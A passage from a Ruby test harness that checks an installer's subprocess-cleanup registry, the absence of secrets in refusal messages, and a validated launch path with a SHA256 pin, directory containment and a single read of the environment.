  INSTALLER.spawn_owner_pids.clear
  s = SequencedSpawn.new("retained_normally", [:confirmed])
  verdict = INSTALLER.send(:retain_unreaped!, s)
  verdict == :unconfirmed && INSTALLER.spawn_owner_pids[s.object_id] == Process.pid &&
    INSTALLER.retry_unreaped! == { confirmed: 1, remaining: 0, skipped_foreign: 0 }
end
check("9z8 a confirmed removal PRUNES the owner registry (no unbounded growth)") do
  INSTALLER.spawn_owner_pids.empty?
end
check("9z9 the initializer documents the ownership gate and names spawn_owner_pids") do
  src = File.read(INITIALIZER)
  src.include?("spawn_owner_pids") && src.include?("own_spawn?") &&
    src.include?("skipped_foreign")
end
INSTALLER.instance_variable_set(:@unreaped, [])
INSTALLER.spawn_owner_pids.clear

# 9e: a raising stop! and a stop!-less object must both be RETAINED and must NOT raise out.
boom = RaisingSpawn.new("boom", [])
stopless = StoplessSpawn.new
good = SequencedSpawn.new("good", [:confirmed])
reset_unreaped!([boom, stopless, good])
survived = begin
  sweep5 = INSTALLER.retry_unreaped!
  true
rescue StandardError, ScriptError
  false
end
check("9e1 a raising stop! does NOT propagate out of retry_unreaped!") { survived }
check("9e2 a raising stop! keeps its spawn RETAINED (never dropped on an exception)") do
  INSTALLER.unreaped_spawns.include?(boom) && boom.stop_calls == 1
end
check("9e2b StoplessSpawn has no object identity problem: it is owner-recorded like the rest") do
  INSTALLER.spawn_owner_pids[stopless.object_id] == Process.pid
end
check("9e3 an object with NO stop! API is retained, never assumed reaped") do
  !stopless.respond_to?(:stop!) && INSTALLER.unreaped_spawns.include?(stopless)
end
check("9e4 one bad spawn does not abort the sweep: the good one was still confirmed+removed") do
  !INSTALLER.unreaped_spawns.include?(good) &&
    sweep5 == { confirmed: 1, remaining: 2, skipped_foreign: 0 }
end

# 9f: empty list, and a non-:confirmed truthy verdict.
reset_unreaped!([])
check("9f1 an EMPTY unreaped list answers { confirmed: 0, remaining: 0, skipped_foreign: 0 }") do
  INSTALLER.retry_unreaped! == { confirmed: 0, remaining: 0, skipped_foreign: 0 }
end
weird = SequencedSpawn.new("weird", [:ok, nil, true])
reset_unreaped!([weird])
check("9f2 a truthy-but-not-:confirmed verdict is NOT treated as confirmed (retained)") do
  INSTALLER.retry_unreaped! == { confirmed: 0, remaining: 1, skipped_foreign: 0 } &&
    INSTALLER.unreaped_spawns.include?(weird)
end
check("9f3 a nil verdict is NOT treated as confirmed (retained)") do
  INSTALLER.retry_unreaped! == { confirmed: 0, remaining: 1, skipped_foreign: 0 }
end
check("9g retry_unreaped! is PUBLIC (a sibling worker / at_exit hook can call it)") do
  INSTALLER.singleton_class.public_method_defined?(:retry_unreaped!) &&
    INSTALLER.respond_to?(:retry_unreaped!)
end
check("9h retry_unreaped! takes NO arguments (the agreed contract shape)") do
  INSTALLER.method(:retry_unreaped!).arity.zero?
end
check("9i the initializer documents that retry_unreaped! closes the RE-STOP guarantee") do
  src = File.read(INITIALIZER)
  src =~ /RE-STOP/ && src.include?("retry_unreaped!")
end
reset_unreaped!([])

# =================================================================================================
# CASE 10 -- NAMES-ONLY LOGGING: no reason leaks a path, a root, or a digest
# =================================================================================================
# Collect EVERY distinct refusal this harness produced, plus the refusals from the full
# `validated_launch` path, and substring-scan them for every secret-ish value in play.
ALL_REASONS = COLLECTED_REASONS.compact.uniq
SECRETS = {
  "the approved script path" => APPROVED_PATH,
  "the outside script path" => OUTSIDE_PATH,
  "the golden server path" => GOLDEN_PATH,
  "the sidecar root" => SIDECAR_ROOT,
  "the run scratch dir" => RUN_DIR,
  "the approved digest" => APPROVED_DIGEST,
  "the wrong digest" => WRONG_DIGEST,
  "the round-033 manifest digest" => MANIFEST_DIGEST
}.freeze

SECRETS.each do |what, value|
  check("10 no refusal reason contains #{what}") do
    ALL_REASONS.none? { |r| r.include?(value) }
  end
end
# SANITY ON THE SCAN ITSELF. A substring scan over an empty or tiny set would pass vacuously, so
# the scan's own coverage is asserted. Two numbers, because they mean different things:
# COLLECTED_REASONS counts every refusal this run produced (many cases legitimately share one
# reason string -- e.g. all seven malformed pins), while ALL_REASONS is the DISTINCT set, i.e. how
# many different refusal messages were actually examined for leaks.
puts "     (refusals collected: #{COLLECTED_REASONS.size}, distinct messages scanned: " \
     "#{ALL_REASONS.size})"
check("10z sanity: the leak scan examined every refusal this run produced, and a " \
      "multi-message distinct set (never a vacuous pass)") do
  COLLECTED_REASONS.size >= 25 && ALL_REASONS.size >= 6 &&
    ALL_REASONS.all? { |r| r.is_a?(String) && !r.empty? }
end

# =================================================================================================
# CASE 11 -- END TO END through `validated_launch`: ONE ENV read, both new gates live
# =================================================================================================
# Drives the REAL snapshot builder (not just the guard) so the proof covers REQUIRED_ENV
# membership, the frozen struct, and the fact that nothing re-reads ENV after validation.
ENV_KEYS = (INSTALLER::REQUIRED_ENV + ["I3_READ_BINDING", "WEB_CONCURRENCY"]).uniq

GOOD_ENV = {
  "I3_I2_INTERPRETER" => REAL_INTERPRETER,
  "I3_I2_SCRIPT" => APPROVED_PATH,
  "I3_STORE_SIDECAR_PATH" => SIDECAR_ROOT,
  "I3_I2_CONFIG" => JSON.generate("page-max" => { "page-max-entries" => 50 },
                                  "fanout-limit" => 8),
  "I3_I2_DEADLINE_MS" => "4242",
  "I3_I2_SCRIPT_SHA256" => APPROVED_DIGEST
}.freeze

def with_env(overrides = {}, drop: [])
  saved = ENV_KEYS.to_h { |k| [k, ENV[k]] }
  ENV_KEYS.each { |k| ENV.delete(k) }
  GOOD_ENV.each { |k, v| ENV[k] = v }
  overrides.each { |k, v| v.nil? ? ENV.delete(k) : ENV[k] = v }
  drop.each { |k| ENV.delete(k) }
  Atomspace::I3ReadPort.clear_counters!
  yield
ensure
  ENV_KEYS.each { |k| ENV.delete(k) }
  saved.each { |k, v| ENV[k] = v unless v.nil? }
end

launch = with_env { INSTALLER.send(:validated_launch) }
check("11a full validated_launch with the approved path + correct pin => a FROZEN " \
      "ValidatedLaunch") do
  launch.is_a?(INSTALLER::ValidatedLaunch) && launch.frozen?
end
check("11b the snapshot carries the pin it validated with (script_digest)") do
  launch.script_digest == APPROVED_DIGEST && launch.script == APPROVED_PATH
end

bad_pin_launch = with_env(drop: ["I3_I2_SCRIPT_SHA256"]) { INSTALLER.send(:validated_launch) }
check("11c validated_launch REFUSES (returns false) when the pin env var is absent") do
  bad_pin_launch == false && Atomspace::I3ReadPort.reset_count.positive?
end
outside_launch = with_env({ "I3_I2_SCRIPT" => OUTSIDE_PATH }) { INSTALLER.send(:validated_launch) }
check("11d validated_launch REFUSES when the script is outside the approved tree") do
  outside_launch == false && Atomspace::I3ReadPort.reset_count.positive?
end
wrong_pin_launch = with_env({ "I3_I2_SCRIPT_SHA256" => WRONG_DIGEST }) do
  INSTALLER.send(:validated_launch)
end
check("11e validated_launch REFUSES on a pin mismatch") { wrong_pin_launch == false }

check("11f ENV is read EXACTLY ONCE on the validation path: the ONLY ENV[...] reads in the " \
      "whole file are the master switch, the single REQUIRED_ENV snapshot, and the prefork " \
      "guard -- `digest_refusal_for` reads none") do
  code = File.read(INITIALIZER).lines.reject { |l| l.strip.start_with?("#") }.join
  reads = code.scan(/ENV\s*\[[^\]]*\]/)
  # Expected exactly: ENV["I3_READ_BINDING"], ENV[key] (the snapshot), ENV[PREFORK_CONCURRENCY_ENV]
  reads.size == 3 &&
    reads.any? { |r| r.include?("I3_READ_BINDING") } &&
    reads.any? { |r| r.include?("[key]") } &&
    reads.any? { |r| r.include?("PREFORK_CONCURRENCY_ENV") }
end
check("11g no ENV.fetch anywhere (a second read would reopen the TOCTOU)") do
  code = File.read(INITIALIZER).lines.reject { |l| l.strip.start_with?("#") }.join
  !code.include?("ENV.fetch")
end
check("11h the file still documents its own guards, and the SUPERSEDED opt-in wording is " \
      "explicitly marked as the defect rather than left in place") do
  src = File.read(INITIALIZER)
  src.include?("PATH CONTAINMENT") && src.include?("MANDATORY") &&
    src =~ /SUPERSEDED BEHAVIOUR/ && src.include?("containment_refusal_for")
end

# ---- summary -------------------------------------------------------------------------------------
puts "=" * 99
puts "PASS: #{PASS.size}   FAIL: #{FAIL.size}   TOTAL: #{PASS.size + FAIL.size}"
puts "LIMITS (explicitly unproven on this host): #{LIMITS.size}"
LIMITS.each { |l| puts "  ~ #{l}" }
unless FAIL.empty?
  puts "FAILURES:"
  FAIL.each { |f| puts "  - #{f}" }
end
puts "=" * 99

# Leave no state behind.
INSTALLER.instance_variable_set(:@installed_pid, nil)
INSTALLER.instance_variable_set(:@unreaped, [])
FileUtils.rm_rf(RUN_DIR)

exit(FAIL.empty? ? 0 : 1)
